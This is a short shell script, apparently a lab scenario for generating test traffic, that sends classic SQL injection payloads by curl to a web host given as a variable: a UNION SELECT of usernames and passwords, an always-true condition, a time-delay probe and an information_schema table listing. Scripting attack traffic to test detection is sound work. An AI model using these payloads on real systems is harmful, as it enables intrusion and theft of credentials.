#!/bin/sh
# web-sqli-attempt: classic injection payloads in query strings.
set -eu
. /lab/scenarios/web-common.sh
echo "SCENARIO_START web-sqli $(date -u +%Y-%m-%dT%H:%M:%SZ)"
curl -s -o /dev/null -G "http://$WEB/products" --data-urlencode "id=1 UNION SELECT username,password FROM users--"
curl -s -o /dev/null -G "http://$WEB/products" --data-urlencode "id=1' OR '1'='1"
curl -s -o /dev/null -G "http://$WEB/search" --data-urlencode "q=1; SELECT sleep(5)"
curl -s -o /dev/null -G "http://$WEB/search" --data-urlencode "q=x' AND 1=0 UNION SELECT table_name FROM information_schema.tables--"
echo "SCENARIO_END web-sqli"
